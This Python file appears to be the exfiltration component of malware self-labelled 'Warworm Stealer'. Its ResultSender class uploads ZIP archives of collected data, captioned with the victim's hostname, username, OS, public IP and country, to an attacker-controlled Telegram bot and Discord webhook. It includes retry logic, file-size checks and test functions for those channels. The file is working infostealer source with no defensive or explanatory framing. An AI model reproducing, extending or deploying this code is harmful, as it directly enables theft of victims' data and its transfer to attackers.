import requests
import os
import json
import time
from datetime import datetime
import traceback

class ResultSender:
    def __init__(self, telegram_token=None, telegram_chat_id=None, discord_webhook=None):
        self.telegram_token = telegram_token
        self.telegram_chat_id = telegram_chat_id
        self.discord_webhook = discord_webhook
        self.session = requests.Session()
        self.session.timeout = 30

    def send_file_with_caption(self, zip_path, system_info_path, custom_filename):
        # Send ZIP file with system info as caption - SINGLE MESSAGE 
        results = {}
        
        # Build caption from system info
        caption = self._build_caption(system_info_path, custom_filename)
        
        # Telegram
        if self.telegram_token and self.telegram_chat_id:
            try:
                url = f"https://api.telegram.org/bot{self.telegram_token}/sendDocument"
                
                with open(zip_path, 'rb') as f:
                    files = {'document': (custom_filename, f, 'application/zip')}
                    data = {
                        'chat_id': self.telegram_chat_id,
                        'caption': caption[:1024] if caption else None,
                        'parse_mode': 'HTML'
                    }
                    
                    response = requests.post(url, files=files, data=data, timeout=60)
                    
                    if response.status_code == 200:
                        results['telegram'] = {'success': True, 'message': f'Sent as {custom_filename}'}
                    else:
                        results['telegram'] = {'success': False, 'message': f'Error {response.status_code}: {response.text}'}
                        
            except Exception as e:
                results['telegram'] = {'success': False, 'message': str(e)}
        
        # Discord
        if self.discord_webhook:
            try:
                with open(zip_path, 'rb') as f:
                    files = {'file': (custom_filename, f, 'application/zip')}
                    data = {
                        'content': caption[:2000] if caption else f"📁 Archive: {custom_filename}"
                    }
                    
                    response = requests.post(
                        self.discord_webhook,
                        data=data,
                        files=files,
                        timeout=60
                    )
                    
                    if response.status_code in [200, 204]:
                        results['discord'] = {'success': True, 'message': f'Sent as {custom_filename}'}
                    else:
                        results['discord'] = {'success': False, 'message': f'Error {response.status_code}'}
                        
            except Exception as e:
                results['discord'] = {'success': False, 'message': str(e)}
        
        return results
    
    def _build_caption(self, system_info_path, custom_filename=None):
        # Build caption from system info file 
        try:
            if not os.path.exists(system_info_path):
                return "📁 Warworm Stealer Report"
            
            with open(system_info_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # Extract key info
            info = {}
            for line in content.split('\n'):
                if ':' in line:
                    key, val = line.split(':', 1)
                    key = key.strip().lower()
                    val = val.strip()
                    if 'hostname' in key: info['hostname'] = val
                    elif 'username' in key: info['username'] = val
                    elif 'platform' in key: info['platform'] = val
                    elif 'public ip' in key: info['ip'] = val
                    elif 'country' in key: info['country'] = val
            
            # Build caption
            hostname = info.get('hostname', 'Unknown')
            username = info.get('username', 'Unknown')
            platform = info.get('platform', 'Unknown')
            ip = info.get('ip', 'Unknown')
            country = info.get('country', 'xxx')
            
            caption = f"""<b>🔴 Warworm Stealer Report</b>

<b>PC:</b> <code>{hostname}</code>
<b>User:</b> <code>{username}</code>
<b>OS:</b> <code>{platform}</code>
<b>IP:</b> <code>{ip}</code>
<b>Country:</b> <code>{country}</code>"""
            
            if custom_filename:
                caption += f"\n\n📁 <b>{custom_filename}</b>"
            
            return caption
            
        except Exception as e:
            return f"📁 Warworm Stealer Report\nError: {e}"

    def send_telegram_message(self, message, parse_mode="HTML"):
        # Send text message to Telegram with retry logic 
        if not self.telegram_token or not self.telegram_chat_id:
            return False, "Telegram credentials not configured"

        url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
        data = {
            "chat_id": self.telegram_chat_id,
            "text": message,
            "parse_mode": parse_mode,
            "disable_web_page_preview": True
        }
        
        max_retries = 3
        for attempt in range(max_retries):
            try:
                response = self.session.post(url, data=data, timeout=30)
                if response.status_code == 200:
                    return True, "Message sent successfully"
                else:
                    error_data = response.json() if response.text else {}
                    error = error_data.get('description', f'HTTP {response.status_code}')
                    if attempt < max_retries - 1:
                        time.sleep(2 ** attempt)
                        continue
                    return False, f"API Error: {error}"
                    
            except requests.exceptions.Timeout:
                if attempt < max_retries - 1:
                    time.sleep(2 ** attempt)
                    continue
                return False, "Timeout after retries"
            except Exception as e:
                if attempt < max_retries - 1:
                    time.sleep(2 ** attempt)
                    continue
                return False, f"Exception: {str(e)}"
        
        return False, "Failed after all retries"

    def send_telegram_file(self, file_path, caption=""):
        # Send file to Telegram with size check and retry logic 
        if not self.telegram_token or not self.telegram_chat_id:
            return False, "Telegram credentials not configured"

        if not os.path.exists(file_path):
            return False, f"File not found: {file_path}"

        file_size = os.path.getsize(file_path)
        max_size = 50 * 1024 * 1024
        if file_size > max_size:
            return False, f"File too large: {file_size / (1024*1024):.1f}MB"

        safe_caption = caption[:1020] + " ..." if len(caption) > 1024 else caption
        token = self.telegram_token.strip()
        chat_id = str(self.telegram_chat_id).strip()
        url = f"https://api.telegram.org/bot{token}/sendDocument"

        max_retries = 3
        for attempt in range(max_retries):
            try:
                with open(file_path, 'rb') as f:
                    files = {'document': (os.path.basename(file_path), f, 'application/octet-stream')}
                    data = {
                        'chat_id': chat_id,
                        'caption': safe_caption,
                        'parse_mode': 'HTML'
                    }
                    response = self.session.post(url, files=files, data=data, timeout=60)

                if response.status_code == 200:
                    return True, f"File sent: {os.path.basename(file_path)}"
                else:
                    try:
                        error_data = response.json()
                        error = error_data.get('description', f'HTTP {response.status_code}')
                    except:
                        error = f"HTTP {response.status_code}"
                    if attempt < max_retries - 1:
                        time.sleep(2 ** attempt)
                        continue
                    return False, f"API Error: {error}"

            except Exception as e:
                if attempt < max_retries - 1:
                    time.sleep(2 ** attempt)
                    continue
                return False, f"Exception: {str(e)}"

        return False, "Failed after all retries"

    def send_discord_message(self, message):
        # Send message to Discord webhook 
        if not self.discord_webhook:
            return False, "Discord webhook not configured"

        try:
            data = {"content": message}
            response = self.session.post(self.discord_webhook, json=data)
            if response.status_code in [200, 204]:
                return True, "Message sent successfully"
            else:
                return False, f"API Error {response.status_code}"
        except Exception as e:
            return False, f"Exception: {str(e)}"

    def send_discord_file(self, file_path, message=""):
        # Send file to Discord webhook 
        if not self.discord_webhook:
            return False, "Discord webhook not configured"

        if not os.path.exists(file_path):
            return False, f"File not found: {file_path}"

        try:
            with open(file_path, 'rb') as f:
                files = {'file': (os.path.basename(file_path), f, 'application/octet-stream')}
                data = {'content': message}
                response = self.session.post(self.discord_webhook, files=files, data=data)
            if response.status_code in [200, 204]:
                return True, f"File sent: {os.path.basename(file_path)}"
            else:
                return False, f"API Error {response.status_code}"
        except Exception as e:
            return False, f"Exception: {str(e)}"


def test_telegram_bot(token, chat_id):
    # Test Telegram bot connection 
    try:
        url = f"https://api.telegram.org/bot{token}/getMe"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            bot_info = response.json().get('result', {})
            bot_name = bot_info.get('first_name', 'Unknown')
            sender = ResultSender(telegram_token=token, telegram_chat_id=chat_id)
            success, msg = sender.send_telegram_message(f"✅ <b>Test</b>\nBot: {bot_name}")
            return success, f"Bot: {bot_name} - {msg}"
        else:
            return False, response.json().get('description', 'Invalid token')
    except Exception as e:
        return False, str(e)


def test_discord_webhook(webhook_url):
    # Test Discord webhook 
    try:
        sender = ResultSender(discord_webhook=webhook_url)
        success, msg = sender.send_discord_message("✅ **Test**\nWebhook working!")
        return success, msg
    except Exception as e:
        return False, str(e)